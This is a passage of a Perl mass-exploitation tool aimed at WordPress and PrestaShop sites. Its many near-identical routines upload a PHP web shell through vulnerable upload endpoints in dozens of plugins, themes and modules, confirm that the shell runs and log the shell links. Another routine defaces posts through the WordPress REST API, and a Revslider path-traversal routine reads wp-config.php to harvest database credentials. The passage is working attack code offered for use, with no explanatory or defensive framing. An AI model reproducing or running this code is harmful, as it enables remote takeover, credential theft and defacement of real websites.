$sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/l.php?X=M0B";
my $field_name = "files[]";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["l.php"] ]
           
            );

$checksexycontactup = $ua->get("$sexycontactup")->content;
if($checksexycontactup =~/M0B - Uname:/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Creative Contact Form";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $sexycontactup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$sexycontactup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Creative Contact Form";

print color('bold red'),"[FAILED]\n";
}
}

################ Work The Flow File Upload #####################
sub wtffu(){
my $url = "$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/";
my $shell ="l.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wtffup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/l.php?X=M0B";

$checkwtffup = $ua->get("$wtffup")->content;
if($checkwtffup =~/M0B - Uname:/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Work The Flow File Upload";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wtffup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$wtffup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Work The Flow File Upload";

print color('bold red'),"[FAILED]\n";
}
}

################ WP Job Manger #####################
sub wpjm(){
my $url = "$site/jm-ajax/upload_file/";
my $image ="m.gif";
my $field_name = "file[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$image"] ]
           
            );

$jobmangerup = "$site/wp-content/uploads/job-manager-uploads/file/$year/$month/m.gif";
$checkpofwup = $ua->get("$jobmangerup")->content_type;
if($checkpofwup =~/image\/gif/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Job Manger";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Link] => $jobmangerup\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
open (TEXT, '>>rez/index.txt');
print TEXT "$jobmangerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Job Manger";

print color('bold red'),"[FAILED]\n";
}
}

################  PHP Event Calendar #####################
sub phpeventcalendar(){
my $url = "$site/wp-content/plugins/php-event-calendar/server/file-uploader/";
my $shell ="l.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$phpevup="$site/wp-content/plugins/php-event-calendar/server/file-uploader/l.php?X=M0B";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"PHP Event Calendar";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $phpevup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$phpevup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"PHP Event Calendar";

print color('bold red'),"[FAILED]\n";
}
}

################ Synoptic #####################
sub synoptic(){
my $url = "$site/wp-content/themes/synoptic/lib/avatarupload/upload.php";
my $shell ="l.php";
my $field_name = "qqfile";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$Synopticup="$site/wp-content/uploads/markets/avatars/l.php?X=M0B";

$checkSynopticup = $ua->get("$Synopticup")->content;
if($checkSynopticup =~/M0B - Uname:/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Synoptic";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $Synopticup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$Synopticup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Synoptic";

print color('bold red'),"[FAILED]\n";
}
}

################ Wpshop #####################
sub Wpshop(){
my $url = "$site/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload";
my $shell ="l.php";
my $field_name = "wpshop_file";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wpshopup="$site/wp-content/uploads/l.php?X=M0B";

$checkwpshopup = $ua->get("$wpshopup")->content;
if($checkwpshopup =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wp Shop";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wpshopup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$wpshopup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wp Shop";

print color('bold red'),"[FAILED]\n";
}
}
################ Content Injection
sub wpinjection(){
$linkposts = $site . 'index.php/wp-json/wp/v2/posts/';

$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;

$ajx = $site . '/wp-json/wp/v2/posts/'.$id;

$sirina=$id . 'justrawdata';
$index='FUCKED BY M0B :)';
$gassface = POST $ajx, [
'id' => $sirina, 'slug' => '/m.htm', 'title' => 'M0B', 'content' => $index];
$response = $ua->request($gassface);
$stat = $response->content;
    if ($stat =~ /FUCKED BY/){
$urljson = "$site/m.htm";
$link = $ua->get($site);
$link = $link->request->uri;
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Content Injection";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Injected Successfully\n";
print color('bold white'),"  [Link] => $urljson\n";
open (TEXT, '>>rez/index.txt');
print TEXT "$urljson\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Content Injection";

print color('bold red'),"[FAILED]\n";
}
}
}
sub getconfig1() {

print"[+] Revslider Config 1";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold green');
print "[Sucess]\n";
    print color('reset');
    print save "[rev cnfg] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print "\t[-]Database Name = $1 \n";
print color 'reset';
        open (TEXT, '>>rez/config.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print "\t[-]Database User = $1 \n";
print color 'reset';
        open (TEXT, '>>rez/config.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print "\t[-]Database Password = $1 \n";
print color 'reset';
        $pass= $1 ;
        open (TEXT, '>>rez/config.txt');
        print TEXT "\nDatabase Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print "\t[-]Database Host = $1 \n\n";
print color 'reset';
        open (TEXT, '>>rez/config.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
        }
}
}
else{
print color('bold red'),"[FAILED]\n";
}
}

sub Wordpress_Themes() {
$path = "/wp-content/themes/purevision/scripts/admin/uploadify/uploadify.php?folder=%2F";
$site_vul = "http://".$site."".$path;
$res = $ua->request(POST $site_vul,
Content_Type => 'form-data',
Content => [
Filedata => ["mob.txt"],
],
);

$url = "http://".$site."/mob.txt";
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();
$response = $useragent->request($request);
$nullcracker = $response->content;
if ($nullcracker =~ /M0B/){
print "[+] Wordpress_Themes [VULN]";
print "[+] Success => $url\n";
open(BEN,">>rez/result.txt");
print BEN "$url\n";
close(BEN);
}else{
print "[-] Exploiting Failed ! \n";
}
}

################ columnadverts #####################
sub columnadverts(){
my $url = "$site/modules/columnadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$columnadvertsup="$site/modules/columnadverts/slides/l.php?X=M0B";

my $checkcolumnadverts = $ua->get("$columnadvertsup")->content;
if($checkcolumnadverts =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"columnadverts";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $columnadvertsup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$columnadvertsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"columnadverts";

print color('bold red'),"[FAILED]\n";
}
}


################ soopamobile #####################
sub soopamobile(){
my $url = "$site/modules/soopamobile/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$soopamobileup="$site/modules/soopamobile/slides/l.php?X=M0B";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/M0B - Uname:/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopamobile";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $soopamobileup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopamobile";

print color('bold red'),"[FAILED]\n";
}
}

################ soopabanners #####################
sub soopabanners(){
my $url = "$site/modules/soopabanners/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$soopabannersup="$site/modules/soopabanners/slides/l.php?X=M0B";

my $checksoopabanners = $ua->get("$soopabannersup")->content;
if($checksoopabanners =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopabanners";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $soopabannersup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$soopabannersup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopabanners";

print color('bold red'),"[FAILED]\n";
}
}

################ vtermslideshow #####################
sub vtermslideshow(){
my $url = "$site/modules/vtermslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$vtermslideshowup="$site/modules/vtermslideshow/slides/l.php?X=M0B";

my $checkvtermslideshow = $ua->get("$vtermslideshowup")->content;
if($checkvtermslideshow =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Vtermslideshow";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $vtermslideshowup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$vtermslideshowup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Vtermslideshow";

print color('bold red'),"[FAILED]\n";
}
}

################ simpleslideshow #####################
sub simpleslideshow(){
my $url = "$site/modules/simpleslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$simpleslideshowup="$site/modules/simpleslideshow/slides/l.php?X=M0B";

my $checksimpleslideshow = $ua->get("$simpleslideshowup")->content;
if($checksimpleslideshow =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"simpleslideshow";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $simpleslideshowup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$simpleslideshowup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"simpleslideshow";

print color('bold red'),"[FAILED]\n";
}
}

################ productpageadverts #####################
sub productpageadverts(){
my $url = "$site/modules/productpageadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$productpageadvertsup="$site/modules/productpageadverts/slides/l.php?X=M0B";

my $checkproductpageadverts = $ua->get("$productpageadvertsup")->content;
if($checkproductpageadverts =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"productpageadverts";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $productpageadvertsup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$productpageadvertsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"productpageadverts";

print color('bold red'),"[FAILED]\n";
}
}

################ homepageadvertise #####################
sub homepageadvertise(){
my $url = "$site/modules/homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$homepageadvertiseup="$site/modules/homepageadvertise/slides/l.php?X=M0B";

my $checkhomepageadvertise = $ua->get("$homepageadvertiseup")->content;
if($checkhomepageadvertise =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $homepageadvertiseup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise";

print color('bold red'),"[FAILED]\n";
}
}

################ homepageadvertise2 #####################
sub homepageadvertise2(){
my $url = "$site/modules/homepageadvertise2/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$homepageadvertise2up="$site/modules/homepageadvertise2/slides/l.php?X=M0B";

my $checkhomepageadvertise2 = $ua->get("$homepageadvertise2up")->content;
if($checkhomepageadvertise2 =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise2";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $homepageadvertise2up\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$homepageadvertise2up\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise2";

print color('bold red'),"[FAILED]\n";
}
}

################ jro_homepageadvertise #####################
sub jro_homepageadvertise(){
my $url = "$site/modules/jro_homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$jro_homepageadvertiseup="$site/modules/jro_homepageadvertise/slides/l.php?X=M0B";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"jro_homepageadvertise";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $jro_homepageadvertiseup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"jro_homepageadvertise";

print color('bold red'),"[FAILED]\n";
}
}

################ attributewizardpro #####################
sub attributewizardpro(){
my $url = "$site/modules/attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$attributewizardproup="$site/modules/attributewizardpro/file_uploads/l.php?X=M0B";

my $checkattributewizardpro = $ua->get("$attributewizardproup")->content;
if($checkattributewizardpro =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardproup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$attributewizardproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro";

print color('bold red'),"[FAILED]\n";
}
}

################ 1attributewizardpro #####################
sub oneattributewizardpro(){
my $url = "$site/modules/1attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$oneattributewizardproup="$site/modules/1attributewizardpro/file_uploads/l.php?X=M0B";

my $checkoneattributewizardpro = $ua->get("$oneattributewizardproup")->content;
if($checkoneattributewizardpro =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"1attributewizardpro";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $oneattributewizardproup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$oneattributewizardproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"1attributewizardpro";

print color('bold red'),"[FAILED]\n";
}
}

################ attributewizardpro.OLD #####################
sub attributewizardproOLD(){
my $url = "$site/modules/attributewizardpro.OLD/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$attributewizardproOLDup="$site/modules/attributewizardpro.OLD/file_uploads/l.php?X=M0B";

my $checkattributewizardproOLD = $ua->get("$attributewizardproOLDup")->content;
if($checkattributewizardproOLD =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Attributewizardpro.OLD";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardproOLDup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$attributewizardproOLDup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Attributewizardpro.OLD";

print color('bold red'),"[FAILED]\n";
}
}


################ attributewizardpro_x #####################
sub attributewizardpro_x(){
my $url = "$site/modules/attributewizardpro_x/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$attributewizardpro_xup="$site/modules/attributewizardpro_x/file_uploads/l.php?X=M0B";

my $checkattributewizardpro_x = $ua->get("$attributewizardpro_xup")->content;
if($checkattributewizardpro_x =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro_x";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardpro_xup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$attributewizardpro_xup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro_x";

print color('bold red'),"[FAILED]\n";
}
}

################ advancedslider #####################
sub advancedslider(){
my $url = "$site/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["l.php.png"],]);

$advancedsliderup="$site/modules/advancedslider/uploads/l.php.png?X=M0B";

my $checkadvancedslider = $ua->get("$advancedsliderup")->content;
if($checkadvancedslider =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"advancedslider";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $advancedsliderup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$advancedsliderup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"advancedslider";

print color('bold red'),"[FAILED]\n";
}
}

################ cartabandonmentpro #####################
sub cartabandonmentpro(){
my $url = "$site/modules/cartabandonmentpro/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["l.php.png"],]);

$cartabandonmentproup="$site/modules/cartabandonmentpro/uploads/l.php.png?X=M0B";

my $checkcartabandonmentpro = $ua->get("$cartabandonmentproup")->content;
if($checkcartabandonmentpro =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentpro";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cartabandonmentproup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$cartabandonmentproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentpro";

print color('bold red'),"[FAILED]\n";
}
}

################ cartabandonmentproOld #####################
sub cartabandonmentproOld(){
my $url = "$site/modules/cartabandonmentproOld/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["l.php.png"],]);

$cartabandonmentproOldup="$site/modules/cartabandonmentproOld/uploads/l.php.png?X=M0B";

my $checkcartabandonmentproOld = $ua->get("$cartabandonmentproOldup")->content;
if($checkcartabandonmentproOld =~/M0B - Uname:/) {
  
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentproOld";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cartabandonmentproOldup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$cartabandonmentproOldup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentproOld";

print color('bold red'),"[FAILED]\n";
}
}

################ videostab #####################
sub videostab(){
my $url = "$site/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["l.php.mp4"],]);

$videostabup="$site/modules/videostab/uploads/l.php.mp4?X=M0B";

my $checkvideostab = $ua->get("$videostabup")->content;
if($checkvideostab =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"videostab";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $videostabup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$videostabup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"videostab";

print color('bold red'),"[FAILED]\n";
}
}

################ wg24themeadministration #####################
sub wg24themeadministration(){
my $url = "$site/modules//wg24themeadministration/wg24_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'pattern_upload', Content => [bajatax => ["l.php"],]);

$wg24themeadministrationup="$site/modules//wg24themeadministration///img/upload/l.php?X=M0B";

my $checkwg24themeadministration = $ua->get("$wg24themeadministrationup")->content;
if($checkwg24themeadministration =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wg24themeadministration";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wg24themeadministrationup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$wg24themeadministrationup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wg24themeadministration";

print color('bold red'),"[FAILED]\n";
}
}

################ fieldvmegamenu #####################
sub fieldvmegamenu(){
my $url = "$site/modules/fieldvmegamenu/ajax/upload.php";
my $shell ="l.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/l.php?X=M0B";

my $checkfieldvmegamenu = $ua->get("$fieldvmegamenuup")->content;
if($checkfieldvmegamenu =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"fieldvmegamenu";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $fieldvmegamenuup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$fieldvmegamenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"fieldvmegamenu";

print color('bold red'),"[FAILED]\n";
}
}


################ wdoptionpanel #####################
sub wdoptionpanel(){
my $url = "$site/modules/wdoptionpanel/wdoptionpanel_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'image_upload', Content => [bajatax => ["l.php"],]);

$wdoptionpanelup="$site/modules/wdoptionpanel/upload/l.php?X=M0B";

my $checkwdoptionpanel = $ua->get("$wdoptionpanelup")->content;
if($checkwdoptionpanel =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wdoptionpanel";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wdoptionpanelup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$wdoptionpanelup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wdoptionpanel";

print color('bold red'),"[FAILED]\n";
}
}


################ pk_flexmenu #####################
sub pk_flexmenu(){
my $url = "$site/modules/pk_flexmenu/ajax/upload.php";
my $shell ="l.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_flexmenuup="$site/modules/pk_flexmenu/uploads/l.php?X=M0B";

